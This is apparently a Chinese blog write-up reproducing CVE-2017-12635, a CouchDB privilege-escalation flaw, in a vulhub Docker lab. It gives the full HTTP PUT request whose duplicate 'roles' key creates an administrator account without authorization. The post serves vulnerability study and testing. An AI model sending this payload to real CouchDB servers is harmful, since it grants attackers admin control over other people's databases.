# CVE-2017-12635（Couchdb 垂直权限绕过漏洞） - 浅笑 996 - 博客园

> 原文：[`www.cnblogs.com/qianxiao996/p/13574642.html`](https://www.cnblogs.com/qianxiao996/p/13574642.html)

## 简介

Apache CouchDB 是一个开源数据库，专注于易用性和成为“完全拥抱 web 的数据库”。它是一个使用 JSON 作为存储格式，JavaScript 作为查询语言，MapReduce 和 HTTP 作为 API 的 NoSQL 数据库。应用广泛，如 BBC 用在其动态内容展示平台，Credit Suisse 用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web 和应用程序）。

在 2017 年年 11 月 15 日，CVE-2017-12635 和 CVE-2017-12636 披露，CVE-2017-12635 是由于二郎和 JavaScript 的对 JSON 解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。

影响版本：小于 1.7.0 以及小于 2.1.1
参考链接：
[`bobao.360.cn/learning/detail/4716.html`](http://bobao.360.cn/learning/detail/4716.html)
[`justi.cz/security/2017/11/14/couchdb-rce-npm.html`](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html)

## 测试环境

[`blog.csdn.net/qq_36374896/article/details/84102101`](https://blog.csdn.net/qq_36374896/article/details/84102101)

#### 编译及启动环境：

cd vulhub-master/couchdb/CVE-2017-12635/
docker-compose build
docker-compose up -d
环境启动后，访问 http://your-ip:5984/_utils/即可看到一个网页页面，说明的 CouchDB 已成功启动。但我们不知道密码，无法登陆。
![在这里插入图片描述](img/924712bfe759a2e33f8d2238e27f7c32.png)

## 漏洞复现

首先，发送如下数据包：

```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 90

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "password": "vulhub"
} 
```

![在这里插入图片描述](img/f1361722cafd72c6403669654e747a41.png)
可见，返回 403 错误：{“error”:“forbidden”,“reason”:“Only _admin may set roles”}，只有管理员才能设置角色角色：

发送包含两个角色的数据包，即可绕过限制：

```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
} 
```

成功创建管理员，账户密码均为 vulhub：
![在这里插入图片描述](img/59b4fc4672d6c1d8f48714ba24671f6e.png)
再次访问 http://your-ip:5984/_utils/，输入账户密码 vulhub，可以成功登录：
![在这里插入图片描述](img/7b30dd95b965748d3318cae9ff874b9e.png)